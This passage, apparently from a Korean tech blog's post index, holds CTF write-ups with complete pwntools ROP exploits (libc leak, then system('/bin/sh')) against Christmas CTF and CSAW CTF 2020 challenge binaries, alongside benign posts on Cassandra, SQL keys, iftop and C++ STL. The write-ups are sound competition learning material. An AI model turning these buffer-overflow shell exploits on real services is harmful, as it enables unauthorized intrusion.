libc.symbols[&#39;system&#39;] binsh_offset = next(libc.search(&quot;/bin/sh&quot;)) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Me&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;CTF&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;Never&#39;) p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;No&#39;) payload = &quot;A&quot;*88 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(solo) p.sendlineafter(&#39;--&gt; &#39;,payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &quot;A&quot;*88 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.sendlineafter(&#39;--&gt; &#39;, payload) p.interactive() p.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ChristmasCTF2019","slug":"ChristmasCTF2019","permalink":"https://blog.jhyeon.dev/tags/ChristmasCTF2019/"}]},{"title":"BISC CTF 2020(oldschool) write up","slug":"bob-bisc-201129","date":"2020-11-20T15:00:00.000Z","updated":"2021-01-17T09:59:19.839Z","comments":true,"path":"2020/11/21/bob-bisc-201129/","link":"","permalink":"https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/","excerpt":"","text":"사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데 오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯) https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"BISC2020","slug":"BISC2020","permalink":"https://blog.jhyeon.dev/tags/BISC2020/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"}]},{"title":"POX(Power of xx) 2020 Write up","slug":"poxctf-201121","date":"2020-11-20T15:00:00.000Z","updated":"2021-01-17T09:58:34.319Z","comments":true,"path":"2020/11/21/poxctf-201121/","link":"","permalink":"https://blog.jhyeon.dev/2020/11/21/poxctf-201121/","excerpt":"","text":"POX 2020 출제자 Write up 자료입니다. 아래 노션에서 풀이를 확인하실 수 있습니다. 질문 사항이 있으시면 &#115;&#x74;&#106;&#x68;&#121;&#x65;&#x6f;&#110;&#x40;&#x6b;&#97;&#x6b;&#x61;&#x6f;&#46;&#99;&#x6f;&#109; 으로 메일을 보내주세요! https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"POX2020","slug":"POX2020","permalink":"https://blog.jhyeon.dev/tags/POX2020/"}]},{"title":"NoSQL - Cassandra Engine","slug":"cassandra-200925","date":"2020-09-24T15:00:00.000Z","updated":"2021-01-17T09:57:20.402Z","comments":true,"path":"2020/09/25/cassandra-200925/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/25/cassandra-200925/","excerpt":"","text":"CassandraCassandra란?Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며, 단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다. Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다. Cassandra의 장점 및 단점장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에, 각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다. Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다. 단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며, Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다. Cassandra Data Structure Cassandra의 데이터 구조는 다음 사진과 같습니다. Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다. 이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고, Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다. Cassandra Column, Super ColumnCassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다. 이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다. 즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다. Cassandra 설치 https://cassandra.apache.org/download/ Cassandra 예제Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준) $ cqlsh 이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다. $ sudo vi /etc/cassandra/cassandra.yaml (104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경 이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다. $ cqlsh -u cassandra -p cassandra # 기본 계정 하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다. cassandra@cqlsh&gt; create user username with password &#39;password&#39; superuser; cassandra@cqlsh&gt; exit $ cqlsh -u username -p password cassandra@cqlsh&gt; drop user cassandra; cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */ 이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다! 새로운 Keyspace 생성username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#39;class&#39;: &#39;SimpleStrategy&#39;, &#39;replication_factor&#39;: 3&#125;; username@cqlsh&gt; desc keyspaces; /* 생성된 keyspace 확인 */ Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 같습니다. SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며, 멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다. 또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다. 새로운 Table 생성username@cqlsh&gt; use keyspace_name; /* 이전에 만든 keyspace로 접속 */ username@cqlsh:keyspace_name&gt; create table test.test_table(idx int, name text, context text); /* 테이블 생성 */ username@cqlsh:keyspace_name&gt; desc test.test_table; 생성한 Table에 데이터 삽입username@cqlsh:keyspace_name&gt; insert into test.test_table (idx, name, context) values (1, &#39;bob&#39;, &#39;bobgood&#39;); /* 데이터 삽입 */ username@cqlsh:keyspace_name&gt; select * from test.test_table; /* 테이블의 모든 행 조회 */ References https://meetup.toast.com/search?searchText=Cassandra http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98 https://newly0513.tistory.com/37","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.jhyeon.dev/tags/NoSQL/"},{"name":"Cassandra","slug":"Cassandra","permalink":"https://blog.jhyeon.dev/tags/Cassandra/"}]},{"title":"DB Primary Key, Foreign Key","slug":"db-key-200924","date":"2020-09-23T15:00:00.000Z","updated":"2021-01-17T09:52:04.255Z","comments":true,"path":"2020/09/24/db-key-200924/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/24/db-key-200924/","excerpt":"","text":"SQL 제약조건 Not Null 데이터에 Null 값이 들어갈 수 없다. Unique 데이터에 중복되는 값이 들어갈 수 없다. Primary Key(PK) 각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함) Foreign Key(FK) 다른 테이블의 레코드를 참조하여 무결성을 검사한다. Check 데이터의 범위 또는 사용자 조건을 지정한다. PK(Primary Key)란?데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다. 기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다. 또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다. (추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만, 테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다. PK(Primary Key) 생성 예제create table test( userid varchar(25) not null, username varchar(5) not null, age int(3) not null, primary key(userid) ); create table test( userid varchar(25) not null, username varchar(5) not null, age int(3) not null, primary key(userid, username) ); 다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다. 이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다. (추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다. FK(Foreign Key)란?테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고, RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다. 예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면, 고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자. 그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고, 여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은, 실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다. FK(Foreign Key) 생성 예제create table Customer_TB( id varchar(25) not null, name varchar(5) not null, age int(3) not null, phone varchar(15) not null, address varchar(20) not null, primary key(id) ); create table Order_TB( order_num int(11) not null auto_increment, customer_id varchar(25) not null, order_date datetime not null, order_amount int(4) not null, primary key(order_num), foreign key(customer_id) references Customer_TB(id) ON UPDATE CASCADE ON DELETE CASCADE ); 두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다. 여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해 참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다. CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다. SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다. NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다. SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다. RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다. References http://www.tcpschool.com/mysql/mysql_constraint_foreignKey","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"DB","slug":"DB","permalink":"https://blog.jhyeon.dev/tags/DB/"},{"name":"Primary Key","slug":"Primary-Key","permalink":"https://blog.jhyeon.dev/tags/Primary-Key/"},{"name":"Foreign Key","slug":"Foreign-Key","permalink":"https://blog.jhyeon.dev/tags/Foreign-Key/"}]},{"title":"Linux[iftop] Example","slug":"linux-iftop-200917","date":"2020-09-16T15:00:00.000Z","updated":"2021-01-17T09:48:42.089Z","comments":true,"path":"2020/09/17/linux-iftop-200917/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/","excerpt":"","text":"Install$ sudo apt-get install libpcap-dev $ sudo apt-get install iftop Command$ sudo iftop # 라이브로 모니터링 하기 때문에 root 권한이 필요하다. 별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다. 첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다. 또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다. 그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다. pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다. $ man pcap-filter $ sudo iftop -f &quot;src host 127.0.0.1&quot; $ sudo iftop -f &quot;dst host 8.8.8.8&quot; 주로 사용될만한 것들을 정리하면 다음과 같다. 자세한 것은 manpage에 보면 상세히 나와있다! pcap-filterdst host hostname 목적지 호스트네임(IP주소)src host hostname 출발지 호스트네임(IP주소)dst port port 목적지 포트src port port 출발지 포트ip proto protocol 프로토콜 유형ether dst ehost 이더넷 목적지 주소가 ehost인지 체크ether src ehost 이더넷 출발지 주소가 ehost인지 체크ether host ehost 이더넷 출발지 또는 목적지 주소가 ehost인지 체크gateway hostname 게이트웨이 호스트네임(IP주소) interactive-moden DNS Resolution on/offs Source Host Hide/UnHided Destination Host Hide/UnHidet Cycle LineN Port Resolution on/offS Port Display(SRC) on/offD Port Display(DST) on/offp Port Display on/off&lt; Sort by Source| Sort by Destinationo | Order by frozen/unfrozenP | Pause Displayh | helpb | bar on/offB | bar show 2/10/40(s) averageT | cumulative totals show/hidej,k | scroll displayf | net-filterl | screen-filterL | lin/log scales! | shell command(default: disabled)q | quit","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"iftop","slug":"iftop","permalink":"https://blog.jhyeon.dev/tags/iftop/"}]},{"title":"CSAW CTF 2020 roppity Write up","slug":"csawctf-200914","date":"2020-09-13T15:00:00.000Z","updated":"2021-01-17T09:41:56.304Z","comments":true,"path":"2020/09/14/csawctf-200914/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/14/csawctf-200914/","excerpt":"","text":"개요DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~ 오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들도 많아서 많이 헤멨는데 조금 더 분발해야겠네요 ㅜ_ㅜ 앞으로 시간될때마다 팀원분들과 같이 CTF 참여해서 글 자주 포스팅 할 예정입니다 :) roppity(analysis)먼저 문제에서 주어지는 파일은 바이너리와 libc 파일입니다. 64bit 환경에서 컴파일 되었고 Memory Mitigation은 별 다른거 없이 NX BIT만 활성화 되어있습니다. IDA로 넘어가서 조금 더 딥하게 분석해봅시다. 메인 함수 안에서 작동하는 매우 간단한 원리의 바이너리 인것을 확인할 수 있습니다. 여기서 공격 벡터로 사용할 수 있는 함수는 puts 함수인데, 해당 함수의 실제 주소를 leak 해서 rop 해주면 끝납니다! 필요한 부분들을 하나씩 찾아봅시다. 일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다. 그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다. #!/usr/bin/python3 from pwn import * p = remote(&#39;pwn.chal.csaw.io&#39;,5016) e = ELF(&#39;./rop&#39;) puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] 이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다. 함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~ 그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다. puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다. 그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다 payload = &quot;A&quot;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&quot;\\n&quot;, payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) print(hex(puts_addr)) 아까 구했던 값들을 그대로 이용해서 함수릭을 해주면 됩니다. 중간에 main symbols을 구해서 마지막에 리턴해주는 이유는 함수 leak을 하고 다시 main 함수로 리턴해서 초기의 상태로 만들어서 공격을 수행해야 하는 간단한 이유입니다. 이제 남은 일은 libc base, system, binsh의 주소를 구해서 sh을 실행시켜주면 끝납니다. 오프셋 계산은 매우 간단합니다. libc base 주소를 구해서 그냥 offset를 더해주면 필요한 함수의 주소가 나옵니다. libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset exploit#!/usr/bin/python3 from pwn import * p = remote(&#39;pwn.chal.csaw.io&#39;,5016) e = ELF(&#39;./rop&#39;) libc = ELF(&#39;./libc-2.27.so&#39;) pr = 0x0000000000400683 # pop rdi ret ret = 0x000000000040048e # ret puts_plt = e.plt[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] main = e.symbols[&#39;main&#39;] puts_offset = libc.symbols[&#39;puts&#39;] system_offset = libc.symbols[&#39;system&#39;] binsh_offset = next(libc.search(&quot;/bin/sh&quot;)) payload = &quot;A&quot;*40 # 32byte + 8 payload += p64(pr) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main) p.sendlineafter(&quot;\\n&quot;, payload) puts_addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) libc_base = puts_addr - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset payload = &quot;A&quot;*40 payload += p64(pr) payload += p64(binsh_addr) payload += p64(ret) payload += p64(system_addr) p.sendline(payload) p.interactive() p.close()","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"},{"name":"CSAWCTF 2020","slug":"CSAWCTF-2020","permalink":"https://blog.jhyeon.dev/tags/CSAWCTF-2020/"}]},{"title":"PicoCTF 2019 Write Up","slug":"picoctf-200911","date":"2020-09-10T15:00:00.000Z","updated":"2021-01-17T09:39:42.050Z","comments":true,"path":"2020/09/11/picoctf-200911/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/11/picoctf-200911/","excerpt":"","text":"해당 포스트 내용은 노션으로 이전되었습니다. https://www.notion.so/jhyeon/PicoCTF-2019-Write-up-358b3f86917443398fa9df9932df5320","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"PicoCTF2019","slug":"PicoCTF2019","permalink":"https://blog.jhyeon.dev/tags/PicoCTF2019/"}]},{"title":"C++ STL(Standard Template Library)","slug":"c-stl-200910","date":"2020-09-09T15:00:00.000Z","updated":"2021-01-17T09:35:17.095Z","comments":true,"path":"2020/09/10/c-stl-200910/","link":"","permalink":"https://blog.jhyeon.dev/2020/09/10/c-stl-200910/","excerpt":"","text":"list(linked list)list는 순서를 유지하는 구조로 이루어진 노드 기반 컨테이너입니다. 원소가 노드 단위로 저장되며, list는 이중 연결 리스트(double linked list)이고 임의 접근이 불가능하고 순차적으로 접근만 허용됩니다. 허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”) list 선언list it - 빈 컨테이너 리스트 생성list lt(n) - 기본값으로 초기화 된 n개위 원소를 가지는 리스트list lt(n,m) - m으로 초기화 된 n개의 원소를 가지는 리스트list lt(lt2) - lt2의 복사본인 lt 리스트 #include &lt;link&gt; // library using namespace std; list 생성자 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;list&gt; using namespace std; int main(void)&#123; list&lt;int&gt; lt1; list&lt;int&gt; lt2(100); list&lt;int&gt; lt3(100, 5); list&lt;int&gt; lt4(lt1); cout &lt;&lt; &quot;lt1 size&quot; &lt;&lt; lt1.size() &lt;&lt; &#39;\\n&#39;; // 0 cout &lt;&lt; &quot;lt2 size&quot; &lt;&lt; lt2.size() &lt;&lt; &#39;\\n&#39;; // 100 cout &lt;&lt; &quot;lt3 size&quot; &lt;&lt; lt3.size() &lt;&lt; &quot;\\n&quot;; // 100 cout &lt;&lt; &quot;lt4 size&quot; &lt;&lt; lt4.size() &lt;&lt; &quot;\\n&quot;; // lt1 == 0 &#125; list 멤버 함수|Name|Contextlt.front()| 맨 앞의 원소를 반환 및 참조한다.lt.back() | 맨 뒤의 원소를 반환 및 참조한다.lt.begin() | 맨 앞의 원소를 가리키는 iterator를 반환한다.lt.end() | 맨 마지막의 다음 원소를 가리키는 iterator를 반환한다.lt.rbegin()| 뒤에서부터 원소를 순차적으로 접근할 때 사용한다. (뒤집었을 때 첫번째)lt.rend() | 뒤에서부터 원소를 순차적으로 접근할 떄 사용한다. (뒤집었을 떄 마지막)lt.push_front(k) | 앞쪽으로 원소 k를 삽입한다.lt.push_back(k) | 뒤쪽으로 원소 k를 삽입한다.lt.pop_front() | 맨 첫번째 원소를 제거한다.lt_pop_back() | 맨 마지막 원소를 제거한다.lt.insert(iter, k) | iter가 가리키는 위치에 원소 k를 삽입하고 iterator를 반환한다.lt.erase() | iterator가 가리키는 원소를 삭제하고, 반환값은 삭제한 원소의 다음 원소를 가리키는 iterator를 반환한다.lt.size() | 원소의 개수를 반환한다.lt.remove(k) | k와 같은 원소를 모두 삭제한다.lt.remove_if(Predicate) | 단항 조건자 Predicate에 해당하는 원소를 모두 삭제한다.lt.reverse() | 원소들의 순차열을 뒤집는다.lt.sort() | 모든 원소를 오름차순으로 정렬하고, 파라미터가 오는 경우에는 파라미터를 기준으로 정렬한다.lt.empty() | 리스트가 비어있으면 true를 반환하고 아닌 경우 false를 반환한다.lt2.swap(lt) | lt와 lt2를 바꾼다.lt2.splice(iter2, lt) | li2에서 iter2가 가리키는 lt의 모든 원소를 잘라서 붙인다.lt2.unique() | 인접한 원소가 같으면 유일하게 만든다.lt2.merge(lt) | lt를 lt2의 내부로 합병 정렬을 한다(기본 : 오름차순 정렬), 두번쨰 파라미터로 정렬 기준을 받을 수도 있다. list 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;list&gt; using namespace std; int main(void)&#123; list&lt;int&gt; ltlist; list&lt;int&gt;::iterator lt; list&lt;int&gt;::iterator lter = ltlist.begin(); // auto begin list&lt;int&gt;::iterator lter2 = ltlist.end(); // auto end ltlist.push_back(10); // 뒤쪽으로 10(원소 k) 삽입 ltlist.push_back(11); // 뒤쪽으로 11(원소 k) 삽입 cout &lt;&lt; ltlist.front() &lt;&lt; &quot;\\n&quot;; // 맨 앞 원소를 반환 및 참조 cout &lt;&lt; ltlist.back() &lt;&lt; &quot;\\n&quot;; // 맨 뒤 원소를 반환 및 참조 ltlist.push_front(1); // 앞쪽으로 1(원소 k) 삽입 ltlist.push_back(12); // 뒤쪽으로 12(원소 k) 삽입 ltlist.pop_front(); // 맨 앞쪽의 원소를 제거 == 1이 삭제되겠지? ltlist.pop_back(); // 맨 뒤쪽의 원소를 제거 == 12가 삭제되겠지? cout &lt;&lt; ltlist.size() &lt;&lt; &quot;\\n&quot;; // 리스트의 크기를 반환 lter++; // 리스트 위치 +1 ltlist.insert(lter, 3); // 리스트의 두번째 위치에 3을 삽입 lter2--; ltlist.erase(lter2); // 마지막 원소를 가리키는 iterator의 원소를 삭제 ltlist.remove(10); // 10과 같은 원소 모두 삭제 ltlist.reverse(); // 순차열 뒤집기 ltlist.sort(); // 오름차순 정렬 cout &lt;&lt; (ltlist.empty() ? &quot;true&quot;: &quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // 리스트가 비어있는지 체크(삼항 연산자 사용) for(lt = ltlist.begin(); lt != ltlist.end(); lt++)&#123; //iterator 반복문 출력 시작 cout &lt;&lt; *lt &lt;&lt; endl; &#125; &#125; vectorSTL의 sequence container의 하나인 vector는 자동으로 메모리가 할당되는 배열이다. 스택과 비슷한 개념이라고 할 수 있고, 중간에 값을 넣거나 삭제할 수 있다. 허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”) vector 선언#include &lt;cstdio&gt; #include &lt;vector&gt; using namespace std; vector &lt;int&gt; v1; vector &lt;int&gt; v2; vector 멤버 함수|Name|Context|v1.assign(a,b)| v1에 b의 값으로 a개의 원소를 할당한다.|v1.at(idx)| idx번째 원소를 참조한다. (범위 점검)|v1[idx]| idx번째 원소를 참조한다. (범위 점검 X)|v1.front()| 첫번째 원소를 참조한다.|v1.back()| 마지막 원소를 참조한다.|v1.clear()| 모든 원소를 제거한다(size만 제거하고, 메모리(capacity)는 남아있다.)|v1.push_back()| 마지막에 원소를 삽입한다.|v1.pop_back()| 마지막 원소를 삭제한다.|v1.begin()| 첫번째 원소를 가리킨다(iterator)|v1.end()| 마지막 원소를 가리킨다(iterator)|v1.rbegin()| 역순의 첫번째 원소를 가리킨다(reverse 개념)|v1.rend()| 역순의 마지막 원소를 가리킨다(reverse 개념)|v1.reserve(n)| n개의 원소를 저장할 위치를 예약한다. (동적할당)|v1.resize(n)| 크기를 n으로 변경한다.|v1.size()| 원소의 개수를 반환한다.|v1.capacity()| 할당된 공간의 크기를 반환한다.|v1.insert(a,b,c)| a의 위치에 b개의 c값을 삽입한다.|v1.insert(a,b)| a의 위치에 b값을 삽입하고 iterator를 반환한다.|v1.empty()| vector가 비어있는지 체크(true/false 반환)|v2.swap(v1)| v1와 v2의 원소, capacity를 바꾼다(swap 개념) 여기서 size() 와 capacity()는 다르다. size는 할당된 메모리안에 들어있는 요소의 개수를 반환하고, capacity는 할당된 메모리의 크기를 반환해주는 것이다. vector 사용 예제#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;vector&gt; using namespace std; int main(void) &#123; vector&lt;int&gt; v1; vector&lt;int&gt; v2; vector &lt;int&gt;::iterator iter; v1.push_back(10); // 맨 뒤에 원소 삽입 아래도 동일 v1.push_back(9); v1.push_back(8); for(iter = v1.begin(); iter != v1.end(); iter++)&#123; // iterator 반복문 선언 cout &lt;&lt; *iter &lt;&lt; endl; &#125; cout &lt;&lt; v1.size() &lt;&lt; &quot;\\n&quot;; // vector v1 사이즈 반환 (10,9,8 이니 총 3개 반환) cout &lt;&lt; v1.capacity() &lt;&lt; &quot;\\n&quot;; // vector v1 할당 메모리 반환 v1.pop_back(); // 맨 끝에 있는 원소를 삭제, 8이 삭제되겠지~ //v1.clear(); // 모든 원소 삭제 cout &lt;&lt; v1.size() &lt;&lt; &quot;\\n&quot;; // vector v1 사이즈 반환 (clear해서 0 반환) cout &lt;&lt; (v1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\\n&quot;; // vector가 비어있는지 체크(삼항 연산자 사용) cout &lt;&lt; v1.front() &lt;&lt; &quot;\\n&quot;; // 맨 앞의 원소 반환 및 참조 cout &lt;&lt; v1.back() &lt;&lt; &quot;\\n&quot;; // 맨 뒤의 원소 반환 및 참조 &#125; setset은 associative container로 노드 기반 컨테이너로 구성되어 있고 균형 이진트리이다. key로 불리는 원소의 집합으로 이루어진 컨테이너이다. (중복 허용 X) insert 함수에 의해서 원소가 삽입되는데 이 떄의 원소는 자동으로 정렬(오름차순)된다. 허용 연산자(“==”, “!=”, “&lt;” “&gt;” “&lt;=” “&gt;=”) set 선언#include &lt;cstdio&gt; #include &lt;iostream&gt; #include &lt;set&gt; using namespace std; int main(void)&#123; set&lt;int&gt; s1; // 기본 생성자 선언 &#125; set 초기화|Name|Context|set&lt;자료형&gt; 변수이름| 기본 생성자 선언|set&lt;자료형&gt; 변수이름(복사할 변수이름)| 생성자 선언 후 복사한 값으로 초기화 set 반복자(iterator)|Name|Context|s1.begin()| 첫번째 원소를 가리킨다.|s1.end()| 마지막 원소를 가리킨다.|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)|s1.cbegin()| begin과 동일하나 const로 선언|s1.cend()| end과 동일하나 const로 선언|s1.crbegin()| rbegin과 동일하나 const로 선언|s1.crend()| rend와 동일하나 const로 선언 set 용량, 크기(size, capacity)|Name|Context|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환|s1.size()| s1의 size(원소 갯수) 